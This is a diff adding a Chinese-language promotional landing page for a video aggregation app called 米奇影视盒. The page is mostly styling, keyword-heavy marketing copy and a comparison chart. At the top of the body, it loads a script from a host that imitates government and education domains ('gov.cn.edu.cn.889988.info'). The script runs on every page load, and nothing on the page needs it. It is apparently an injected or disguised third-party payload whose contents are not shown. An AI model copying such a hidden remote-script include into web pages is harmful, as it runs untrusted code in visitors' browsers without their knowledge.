@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>米奇影视盒 | 米奇影视盒 miqiyingshihe 影视盒子与影视聚合播放工具</title>
+<meta name="keywords" content="米奇影视盒,miqiyingshihe,影视盒,影视盒子,影视聚合,影视播放,电视盒子,影视推荐">
+<meta name="description" content="米奇影视盒 miqiyingshihe-cn.github.io 是一款影视盒子与影视聚合播放工具，汇集电影、电视剧、综艺、动漫等多源影视资源，支持电视、手机、电脑多端使用。">
+<meta name="robots" content="index,follow">
+<meta name="author" content="米奇影视盒">
+<link rel="canonical" href="https://miqiyingshihe-cn.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei","Segoe UI",sans-serif;background:#0c0e14;color:#e4e7ee;line-height:1.7;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+:root{--pk:#ff3b7b;--pp:#7b2cff;--paper:#0c0e14;--card:#151823;--card2:#1c2030;--line:#2a2f42;--mute:#9099af}
+.wrap{max-width:1160px;margin:0 auto;padding:0 18px}
+
+/* 顶部 */
+.top{position:sticky;top:0;z-index:99;background:rgba(12,14,20,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.top .wrap{display:flex;align-items:center;justify-content:space-between;height:64px;gap:14px}
+.logo{display:flex;align-items:center;gap:11px;font-size:19.5px;font-weight:800;color:#fff}
+.logo .mk{width:34px;height:34px;border-radius:10px;background:linear-gradient(140deg,var(--pk),var(--pp));display:grid;place-items:center;font-size:17px;box-shadow:0 5px 16px rgba(123,44,255,.4)}
+.nav{display:flex;gap:4px;align-items:center}
+.nav a{padding:8px 14px;border-radius:8px;font-size:14.5px;color:var(--mute);transition:.2s}
+.nav a:hover{color:#fff;background:var(--card)}
+.nav a.hot{color:#fff;background:linear-gradient(140deg,var(--pk),var(--pp));font-weight:700}
+.nav a.hot:hover{box-shadow:0 5px 16px rgba(255,59,123,.4)}
+.burger{display:none;width:42px;height:42px;border:1px solid var(--line);border-radius:9px;background:var(--card);color:#fff;font-size:19px;cursor:pointer}
+
+/* 通用 */
+section{padding:58px 0}
+.lead-h{display:flex;align-items:flex-end;gap:14px;justify-content:space-between;flex-wrap:wrap;margin-bottom:26px}
+.lead-h .t{font-size:24px;color:#fff}
+.lead-h .t b{font-weight:800;background:linear-gradient(140deg,var(--pk),var(--pp));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.lead-h .d{display:block;font-size:13px;color:var(--mute);font-weight:400;margin-top:4px}
+.more{font-size:13.5px;color:var(--mute);white-space:nowrap}
+.more:hover{color:var(--pk)}
+
+/* Hero（方案一：功能开关面板 + 环形进度） */
+.hero{position:relative;padding:68px 0 60px;background:
+  radial-gradient(560px 320px at 90% 8%,rgba(123,44,255,.22),transparent 60%),
+  radial-gradient(520px 320px at 6% 92%,rgba(255,59,123,.16),transparent 60%),
+  #0c0e14}
+.hero-grid{display:grid;grid-template-columns:1fr 1fr;gap:44px;align-items:center}
+.eyebrow{display:inline-flex;align-items:center;gap:7px;padding:5px 13px;border-radius:30px;background:rgba(255,59,123,.12);border:1px solid rgba(255,59,123,.4);color:var(--pk);font-size:12.5px;margin-bottom:18px}
+.hero h1{font-size:40px;line-height:1.3;color:#fff;margin-bottom:16px}
+.hero h1 i{font-style:normal;background:linear-gradient(140deg,var(--pk),var(--pp));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.hero .desc{color:var(--mute);font-size:15.5px;max-width:500px;margin-bottom:24px}
+.switches{display:grid;gap:11px}
+.sw{display:flex;align-items:center;gap:14px;background:var(--card);border:1px solid var(--line);border-radius:13px;padding:14px 16px;transition:.2s}
+.sw:hover{border-color:var(--pk);transform:translateX(4px)}
+.sw .ic{width:38px;height:38px;border-radius:10px;background:linear-gradient(140deg,var(--pk),var(--pp));display:grid;place-items:center;font-size:16px;flex:0 0 auto}
+.sw .tx{flex:1;min-width:0}
+.sw .tx strong{display:block;color:#fff;font-size:14.5px}
+.sw .tx span{color:var(--mute);font-size:12.5px}
+.sw .on{width:44px;height:24px;border-radius:20px;background:linear-gradient(140deg,var(--pk),var(--pp));position:relative;flex:0 0 auto}
+.sw .on::after{content:"";position:absolute;width:18px;height:18px;border-radius:50%;background:#fff;top:3px;right:3px}
+.cta{display:flex;gap:12px;flex-wrap:wrap;margin-top:26px}
+.btn{display:inline-flex;align-items:center;gap:7px;padding:13px 26px;border-radius:10px;font-weight:700;transition:.2s;cursor:pointer;border:0}
+.btn-g{background:linear-gradient(140deg,var(--pk),var(--pp));color:#fff}
+.btn-g:hover{transform:translateY(-3px);box-shadow:0 12px 28px rgba(255,59,123,.38)}
+.btn-o{border:1px solid var(--line);color:#fff;background:transparent}
+.btn-o:hover{background:var(--card);border-color:var(--pk)}
+
+/* 栏目一（方案二：胶片时间轴） */
+.film{position:relative;padding-left:30px}
+.film::before{content:"";position:absolute;left:9px;top:6px;bottom:6px;width:3px;border-radius:3px;background:linear-gradient(180deg,var(--pk),var(--pp))}
+.film-item{position:relative;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px 18px;margin-bottom:16px;transition:.2s}
+.film-item:hover{border-color:var(--pk);transform:translateX(5px)}
+.film-item::before{content:"";position:absolute;left:-25px;top:22px;width:14px;height:14px;border-radius:50%;background:linear-gradient(140deg,var(--pk),var(--pp));box-shadow:0 0 0 4px rgba(255,59,123,.15)}
+.film-item .hd{display:flex;gap:12px;align-items:center;margin-bottom:7px;flex-wrap:wrap}
+.film-item .yr{font-size:12px;color:var(--pk);font-weight:700;background:rgba(255,59,123,.12);padding:3px 10px;border-radius:20px}
+.film-item h4{color:#fff;font-size:16.5px}
+.film-item .meta{color:var(--mute);font-size:13px;margin-bottom:8px}
+.film-item .meta span{margin-right:12px}
+.film-item p{color:#c5cad8;font-size:13.5px}
+
+/* 栏目二（方案三：棋盘式卡片矩阵） */
+.board{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.cell{position:relative;padding:22px 18px;min-height:150px;border-radius:16px;overflow:hidden;border:1px solid var(--line);transition:.25s}
+.cell:hover{transform:translateY(-5px)}
+.cell.c1{background:linear-gradient(160deg,#23112e,#150a1c);border-color:rgba(123,44,255,.45)}
+.cell.c2{background:linear-gradient(160deg,#2e111c,#1c0a12);border-color:rgba(255,59,123,.45)}
+.cell.c3{background:linear-gradient(160deg,#11232e,#0a1a1c);border-color:rgba(0,180,200,.45)}
+.cell.c4{background:linear-gradient(160deg,#2e2511,#1c170a);border-color:rgba(220,160,40,.45)}
+.cell.c5{background:linear-gradient(160deg,#112e1c,#0a1c12);border-color:rgba(40,180,100,.45)}
+.cell.c6{background:linear-gradient(160deg,#231e2e,#150f1c);border-color:rgba(150,90,220,.45)}
+.cell .num{font-size:40px;font-weight:800;opacity:.22;line-height:1}
+.cell h4{color:#fff;font-size:16px;margin:10px 0 5px}
+.cell p{color:var(--mute);font-size:13px;position:relative;z-index:1}
+.cell .big{position:absolute;right:-10px;bottom:-14px;font-size:70px;font-weight:800;opacity:.08;line-height:1}
+
+/* 栏目三（方案四：双栏对比参数条） */
+.cmp{display:grid;grid-template-columns:1fr 1fr;gap:38px}
+.cmp .box{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px}
+.cmp .box h4{color:#fff;font-size:16px;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid var(--line)}
+.cmp .kv{display:grid;gap:14px}
+.cmp .kv div{display:grid;grid-template-columns:88px 1fr;gap:12px;align-items:center;font-size:13.5px}
+.cmp .kv dt{color:var(--mute)}
+.cmp .kv dd{color:#fff}
+.bar-in{height:8px;border-radius:8px;background:#252a3a;overflow:hidden}
+.bar-in i{display:block;height:100%;border-radius:8px;background:linear-gradient(90deg,var(--pk),var(--pp))}
+.diff{margin-top:14px;padding-top:14px;border-top:1px solid var(--line);font-size:13px;color:var(--pk)}
+
+/* 页脚 */
+.foot{background:#07080c;border-top:1px solid var(--line);padding:48px 0 20px}
+.foot .wrap{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:30px}
+.foot h5{color:#fff;font-size:14.5px;margin-bottom:14px}
+.foot p,.foot a{color:var(--mute);font-size:13px}
+.foot ul li{margin-bottom:8px}
+.foot ul a:hover{color:var(--pk)}
+.copy{margin-top:34px;padding-top:18px;border-top:1px solid var(--line);text-align:center;font-size:12px;color:var(--mute)}
+
+/* 响应式 */
+@media(max-width:960px){
+  .hero-grid,.cmp{grid-template-columns:1fr;gap:34px}
+  .board{grid-template-columns:1fr 1fr}
+  section{padding:46px 0}
+}
+@media(max-width:640px){
+  .burger{display:block}
+  .nav{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;padding:14px;background:var(--paper);border-bottom:1px solid var(--line)}
+  .nav.on{display:flex}
+  .nav a{width:100%;text-align:center;padding:12px}
+  .hero h1{font-size:27px}
+  .board{grid-template-columns:1fr}
+  .foot .wrap{grid-template-columns:1fr 1fr}
+  .film{padding-left:24px}
+  .film-item::before{left:-21px}
+  .lead-h .t{font-size:20px}
+  .cmp .kv div{grid-template-columns:72px 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<div class="top">
+  <div class="wrap">
+    <a class="logo" href="#top"><span class="mk">📺</span>米奇影视盒</a>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#film">影库</a>
+      <a href="#board">功能</a>
+      <a href="#cmp">参数</a>
+      <a href="#home" class="hot">立即使用</a>
+    </nav>
+    <button class="burger" id="burger" aria-label="菜单">☰</button>
+  </div>
+</div>
+
+<!-- Hero -->
+<section class="hero" id="top">
+  <div class="wrap">
+    <div class="hero-grid">
+      <div>
+        <span class="eyebrow">● 米奇影视盒 · 影视聚合播放</span>
+        <h1>一个<i>米奇影视盒</i>，<br>装下所有想看的影视</h1>
+        <p class="desc">米奇影视盒 miqiyingshihe-cn 是一款影视盒子与影视聚合播放工具，把电影、电视剧、综艺、动漫装进同一个盒子，多端通用、即开即看。</p>
+        <div class="cta">
+          <a class="btn btn-g" href="#film">▶ 看看影库</a>
+          <a class="btn btn-o" href="#board">了解功能</a>
+        </div>
+      </div>
+      <div class="switches">
+        <div class="sw"><span class="ic">🎬</span><div class="tx"><strong>多源影视聚合</strong><span>汇集主流影视来源，一次收录更多影视内容</span></div><span class="on"></span></div>
+        <div class="sw"><span class="ic">📱</span><div class="tx"><strong>电视手机电脑三端通用</strong><span>手机、平板、电视、电脑同步支持</span></div><span class="on"></span></div>
+        <div class="sw"><span class="ic">🔍</span><div class="tx"><strong>智能搜索与分类</strong><span>按类型、年份、地区快速筛选影视</span></div><span class="on"></span></div>
+        <div class="sw"><span class="ic">⚡</span><div class="tx"><strong>极速加载不卡顿</strong><span>轻量内核，低配置设备也能流畅运行</span></div><span class="on"></span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：影库胶片 -->
+<section id="home">
+  <div class="wrap">
+    <div class="lead-h">
+      <div class="t">米奇影视盒 <b>影库</b>精选<span class="d">米奇影视盒收录的影视内容，按年份整理</span></div>
+      <a class="more" href="#">完整片单 ›</a>
+    </div>
+    <div class="film">
+      <div class="film-item">
+        <div class="hd"><span class="yr">2024</span><h4>热播院线电影</h4></div>
+        <div class="meta"><span>动作</span><span>科幻</span><span>喜剧</span><span>剧情</span></div>
+        <p>2024 年院线热映电影合集，涵盖中外大片，4K 与 1080P 多规格可选，米奇影视盒持续收录更新。</p>
+      </div>
+      <div class="film-item">
+        <div class="hd"><span class="yr">2023</span><h4>高分口碑剧集</h4></div>
+        <div class="meta"><span>古装</span><span>悬疑</span><span>年代</span><span>都市</span></div>
+        <p>2023 年口碑佳作整理，从古装权谋到现代悬疑，米奇影视盒为你分类归档，找片不费时间。</p>
+      </div>
+      <div class="film-item">
+        <div class="hd"><span class="yr">常驻</span><h4>经典老片与怀旧剧场</h4></div>
+        <div class="meta"><span>经典</span><span>怀旧</span><span>港片</span><span>老剧</span></div>
+        <p>经典港片、老牌电视剧与时代记忆，米奇影视盒长期保留，随时回顾那些年的影视佳作。</p>
+      </div>
+      <div class="film-item">
+        <div class="hd"><span class="yr">更新中</span><h4>动漫番剧与综艺娱乐</h4></div>
+        <div class="meta"><span>热血</span><span>治愈</span><span>综艺</span><span>纪实</span></div>
+        <p>日漫新番、国产动画与综艺节目同步跟进，米奇影视盒每周更新，追番追综不漏一集。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：功能矩阵 -->
+<section id="film" style="background:linear-gradient(180deg,#0c0e14,#10131d)">
+  <div class="wrap">
+    <div class="lead-h">
+      <div class="t">米奇影视盒 <b>六大</b>功能<span class="d">影视盒子的核心能力一览</span></div>
+      <a class="more" href="#">功能详情 ›</a>
+    </div>
+    <div class="board">
+      <div class="cell c1"><div class="num">01</div><div class="big">◎</div><h4>多源聚合</h4><p>聚合多路影视来源，片源丰富不重复，想看的内容基本都能找到。</p></div>
+      <div class="cell c2"><div class="num">02</div><div class="big">▶</div><h4>一键播放</h4><p>无需繁琐设置，打开米奇影视盒即选即播，秒切清晰度和线路。</p></div>
+      <div class="cell c3"><div class="num">03</div><div class="big">☁</div><h4>云端同步</h4><p>收藏与观看记录云端保存，换设备登录即可继续观看进度。</p></div>
+      <div class="cell c4"><div class="num">04</div><div class="big">★</div><h4>个性推荐</h4><p>根据观看偏好智能推荐影视内容，越用越懂你的口味。</p></div>
+      <div class="cell c5"><div class="num">05</div><div class="big">⤓</div><h4>离线缓存</h4><p>支持视频缓存到本地，地铁、出行无网络也能看影视。</p></div>
+      <div class="cell c6"><div class="num">06</div><div class="big">◈</div><h4>弹幕投屏</h4><p>手机一键投屏到电视大屏，配合弹幕互动，氛围感拉满。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：参数对比 -->
+<section id="board">
+  <div class="wrap">
+    <div class="lead-h">
+      <div class="t">米奇影视盒 <b>规格</b>参数<span class="d">与其他影视盒子的能力对比</span></div>
+      <a class="more" href="#">完整对比 ›</a>
+    </div>
+    <div class="cmp">
+      <div class="box">
+        <h4>米奇影视盒</h4>
+        <div class="kv">
+          <div><dt>片源数量</dt><dd><div class="bar-in"><i style="width:95%"></i></div></dd></div>
+          <div><dt>播放流畅度</dt><dd><div class="bar-in"><i style="width:92%"></i></div></dd></div>
+          <div><dt>设备适配</dt><dd><div class="bar-in"><i style="width:90%"></i></div></dd></div>
+          <div><dt>资源更新</dt><dd><div class="bar-in"><i style="width:88%"></i></div></dd></div>
+          <div><dt>上手难度</dt><dd><div class="bar-in"><i style="width:95%"></i></div></dd></div>
+        </div>
+        <div class="diff">✓ 聚合、播放、投屏、缓存一体，一个盒子全搞定</div>
+      </div>
+      <div class="box">
+        <h4>传统影视盒子</h4>
+        <div class="kv">
+          <div><dt>片源数量</dt><dd><div class="bar-in"><i style="width:55%"></i></div></dd></div>
+          <div><dt>播放流畅度</dt><dd><div class="bar-in"><i style="width:60%"></i></div></dd></div>
+          <div><dt>设备适配</dt><dd><div class="bar-in"><i style="width:50%"></i></div></dd></div>
+          <div><dt>资源更新</dt><dd><div class="bar-in"><i style="width:45%"></i></div></dd></div>
+          <div><dt>上手难度</dt><dd><div class="bar-in"><i style="width:40%"></i></div></dd></div>
+        </div>
+        <div class="diff">✗ 片源单一、更新滞后，常需手动折腾</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="wrap">
+    <div>
+      <a class="logo" href="#top"><span class="mk">📺</span>米奇影视盒</a>
+      <p style="margin-top:12px;max-width:290px">米奇影视盒 miqiyingshihe-cn.github.io 是影视盒子与影视聚合播放工具，汇集电影、电视剧、综艺、动漫等多源影视资源，多端通用。</p>
+    </div>
+    <div><h5>站点导航</h5><ul><li><a href="#home">首页</a></li><li><a href="#film">影库精选</a></li><li><a href="#board">功能矩阵</a></li><li><a href="#cmp">规格参数</a></li></ul></div>
+    <div><h5>资源分类</h5><ul><li><a href="#">电影盒子</a></li><li><a href="#">电视剧盒子</a></li><li><a href="#">综艺盒子</a></li><li><a href="#">动漫盒子</a></li></ul></div>
+    <div><h5>关于本站</h5><ul><li><a href="#">使用说明</a></li><li><a href="#">免责声明</a></li><li><a href="#">版权声明</a></li><li><a href="#">联系我们</a></li></ul></div>
+  </div>
+  <div class="wrap"><div class="copy">© 2026 米奇影视盒 miqiyingshihe-cn.github.io · 本站仅提供影视信息指引，资源版权归原作者及发行方所有</div></div>
+</footer>
+
+<script>
+var burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger.addEventListener('click',function(){nav.classList.toggle('on');});
+nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('on');});});
+</script>
+</body>
+</html>
